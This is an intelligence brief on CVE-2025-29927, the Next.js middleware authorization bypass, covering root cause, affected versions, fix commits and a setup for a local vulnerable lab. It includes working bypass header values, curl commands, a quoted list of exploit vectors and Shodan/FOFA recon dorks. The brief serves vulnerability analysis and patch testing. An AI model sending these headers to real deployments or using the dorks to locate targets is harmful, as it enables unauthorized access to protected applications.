# Intel Brief: CVE-2025-29927

## CVE Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-29927 |
| **Title** | Next.js Middleware Authorization Bypass |
| **Affected Software** | Next.js (Vercel) |
| **Vendor** | Vercel |
| **CVSS Score** | 9.1 (Critical) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| **EPSS** | 92.9% (99.8th percentile) |
| **CWE** | CWE-285 (Improper Authorization), CWE-863 (Incorrect Authorization) |
| **Published** | 2025-03-21 |
| **Exploited in Wild** | Yes (VulnCheck KEV: 2025-03-28) |
| **GHSA ID** | GHSA-f82v-jwr5-mffw |

## Affected Versions

| Branch | Vulnerable Range | Patched Version |
|---|---|---|
| v15.x | 15.0.0 – 15.2.2 | **15.2.3** |
| v14.x | 14.0.0 – 14.2.24 | **14.2.25** |
| v13.x | 13.0.0 – 13.5.8 | **13.5.9** |
| v12.x/v11.x | 11.1.4 – 12.3.4 | **12.3.5** |

## Description

Next.js middleware can be completely bypassed by an unauthenticated attacker sending a crafted HTTP header. The vulnerability exists in the middleware sandbox execution layer (`packages/next/src/server/web/sandbox/sandbox.ts`).

### Root Cause

Next.js uses an internal header `x-middleware-subrequest` to track middleware recursion depth. This header is intended for internal use when middleware triggers sub-requests. The `run()` function in `sandbox.ts` reads this header directly from incoming HTTP requests without any validation of origin:

```typescript
// sandbox.ts lines 96-114 (vulnerable code in v15.2.2)
const subreq = params.request.headers[`x-middleware-subrequest`]
const subrequests = typeof subreq === 'string' ? subreq.split(':') : []

const MAX_RECURSION_DEPTH = 5
const depth = subrequests.reduce(
    (acc, curr) => (curr === params.name ? acc + 1 : acc),
    0
)

if (depth >= MAX_RECURSION_DEPTH) {
    return {
        waitUntil: Promise.resolve(),
        response: new runtime.context.Response(null, {
            headers: {
                'x-middleware-next': '1',  // <-- SKIP MIDDLEWARE ENTIRELY
            },
        }),
    }
}
```

When the recursion depth check hits `MAX_RECURSION_DEPTH` (5), the middleware is **completely skipped** — the response has `x-middleware-next: 1` which tells Next.js to continue to the next handler without executing middleware logic.

### Exploit Mechanism

An attacker simply sends the `x-middleware-subrequest` header with the middleware name repeated 5 times (colon-separated):

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

This causes `depth >= MAX_RECURSION_DEPTH` to evaluate as `true`, and the middleware is skipped entirely. If the middleware contains authorization checks, authentication is completely bypassed.

### Header Values by Next.js Version

| Version Range | Default Middleware Name | Exploit Header Value |
|---|---|---|
| 15.x, 14.x, 13.x | `middleware` | `middleware:middleware:middleware:middleware:middleware` |
| 15.x, 14.x, 13.x (src dir) | `src/middleware` | `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` |
| 12.x, 11.x | `pages/_middleware` | `pages/_middleware` (single value, no recursion check in older versions) |

**Note**: In Next.js versions prior to 13 (v11.1.4–12.3.4), the recursion depth check did not exist. The mere presence of `x-middleware-subrequest` with the middleware name was sufficient to skip middleware. Only a single header value is needed.

## Fix Analysis

**Fix Commit (v15.x canary)**: `52a078da3884efe6501613c7834a3d02a91676d2` — PR #77201
**Fix Commit (v14.x backport)**: `5fd3ae8f8542677c6294f32d18022731eab6fe48` — PR #77202

The fix introduces a **session-specific secret token** to validate that `x-middleware-subrequest` headers originate from the application itself:

1. **`router-server.ts`**: Generates a random 8-byte hex string at server startup, stored in `globalThis[Symbol.for('@next/middleware-subrequest-id')]`
2. **`server-ipc/utils.ts`**: In `filterInternalHeaders()`, strips the `x-middleware-subrequest` header if the accompanying `x-middleware-subrequest-id` does not match the session secret
3. **`context.ts`**: Attaches the session secret as `x-middleware-subrequest-id` to all legitimate internal subrequests

This ensures external requests cannot spoof the subrequest header — they don't know the session secret, so their `x-middleware-subrequest` header is stripped before reaching the sandbox.

## Repository Information

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/vercel/next.js.git |
| **Vulnerable Version Checked Out** | `v15.2.2` (tag, commit `f4552826e1`) |
| **Fix Commit** | `52a078da3884efe6501613c7834a3d02a91676d2` |
| **Patched Version** | `v15.2.3` (tag, commit `535e26d3c6`) |

## Build System & Lab Strategy

### Build System (Monorepo — NOT for lab use)
- **Monorepo**: pnpm workspaces + Turborepo + Lerna
- **Language**: TypeScript/JavaScript
- **Build**: `turbo run build`
- **This is a 27,000+ file monorepo — DO NOT attempt to build from source for the lab**

### Recommended Lab Strategy

**Do NOT build Next.js from source.** Instead, create a minimal Next.js application that uses the vulnerable version from npm:

```json
{
  "dependencies": {
    "next": "14.2.24",
    "react": "^18",
    "react-dom": "^18"
  }
}
```

For the lab, version **14.2.24** is recommended over 15.2.2 because:
- React 18 is simpler to set up (no RC dependencies)
- The vulnerability mechanism is identical across all affected versions
- Multiple PoCs target v14 specifically

### Minimal Vulnerable App Structure

```
/app
  middleware.js        — Auth check middleware (the vulnerable component)
  /app/api/hello/route.js  — Protected API endpoint
  /app/page.js         — Basic page
  package.json         — next@14.2.24
```

### Key Middleware Code (middleware.js)

```javascript
import { NextResponse } from "next/server";

export function middleware(req) {
  const authHeader = req.headers.get("authorization");
  if (!authHeader || authHeader !== "my-secret-token") {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }
  return NextResponse.next();
}

export const config = {
  matcher: "/api/:path*",
};
```

### Key Dependencies for Lab
- Node.js 18+ (LTS recommended)
- npm (package manager)
- `next@14.2.24` (vulnerable) / `next@14.2.25` (patched, for comparison)
- `react@^18`, `react-dom@^18`

## Exploit / PoC Details

### Trivial Exploit (curl one-liner)

```bash
# Normal request — blocked by middleware (401 Unauthorized)
curl http://localhost:3000/api/hello

# Bypass middleware — returns protected content (200 OK)
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3000/api/hello
```

### Public Exploits Assessment

| ID | Source | Name | Classification | Reliability | Notes |
|---|---|---|---|---|---|
| 12189 | ExploitDB | EDB-52124 | working_poc | reliable | Reference text with curl commands |
| 63723 | GitHub | aydinnyunus/CVE-2025-29927 (★96) | working_poc | reliable | Python script, 95% confidence |
| 63721 | GitHub | azu/nextjs-cve-2025-29927-poc (★15) | working_poc | reliable | Complete Next.js 15.2.2 app, 100% confidence |
| 63722 | GitHub | lirantal/vulnerable-nextjs-14 (★14) | working_poc | reliable | Complete Next.js 14.2.24 app, 100% confidence |
| 63789 | GitHub | UNICORDev/exploit-CVE-2025-29927 (★8) | working_poc | reliable | Full Python exploit with version detection |
| 63765 | GitHub | AnonKryptiQuz/NextSploit (★82) | scanner | reliable | Vulnerability scanner |

**⚠️ Flagged as suspicious**: `0xb1lal/CVE-2025-29927` (social engineering lure), `goncalocsousa1/CVE-2025-29927` (obfuscated, no exploit code)

**Best reference PoC**: UNICORDev/exploit-CVE-2025-29927 (id=63789) — comprehensive Python exploit with version detection and multiple bypass vectors for all affected versions.

### UNICORDev Exploit Vectors (from exploit code)

```python
exploit_vectors = [
    # Version 13+ with recursion depth check (v13, v14, v15)
    {"X-Middleware-Subrequest": "middleware:middleware:middleware:middleware:middleware"},
    # Version 13+ with src directory
    {"X-Middleware-Subrequest": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"},
    # Version 12.2-13
    {"X-Middleware-Subrequest": "middleware"},
    # Version 12.2-13 with src directory
    {"X-Middleware-Subrequest": "src/middleware"},
    # Version pre-12.2
    {"X-Middleware-Subrequest": "pages/_middleware"},
    # Most comprehensive payload
    {"X-Middleware-Subrequest": "src/middleware:middleware:pages/_middleware"},
]
```

## Nuclei Templates

Two Nuclei templates available:
- **CVE-2025-29927** (authors: pdresearch,pdteam,hazedic) — Active scanner
- **CVE-2025-29927-HEADLESS** (author: ademking) — Passive/headless scanner

Recon dorks:
- **Shodan**: `x-middleware-rewrite`
- **FOFA**: `x-middleware-rewrite`

## References

| Type | URL |
|---|---|
| Vendor Advisory | https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw |
| Fix Commit (v15) | https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2 |
| Fix Commit (v14) | https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48 |
| Release v15.2.3 | https://github.com/vercel/next.js/releases/tag/v15.2.3 |
| Release v14.2.25 | (implicit from tags) |
| Release v13.5.9 | https://github.com/vercel/next.js/releases/tag/v13.5.9 |
| Release v12.3.5 | https://github.com/vercel/next.js/releases/tag/v12.3.5 |
| OSS-Security | http://www.openwall.com/lists/oss-security/2025/03/23/3 |
| NetApp Advisory | https://security.netapp.com/advisory/ntap-20250328-0002/ |
| ExploitDB | https://www.exploit-db.com/exploits/52124 |

## Vulnerable Code Location

**File**: `packages/next/src/server/web/sandbox/sandbox.ts`
**Function**: `run()` (the `withTaggedErrors` wrapped runner)
**Lines**: 96–114 (in v15.2.2)

The vulnerability is in the middleware execution sandbox. The `x-middleware-subrequest` header is read from the incoming request without any origin validation and used to determine if middleware should be skipped (recursion guard bypass).
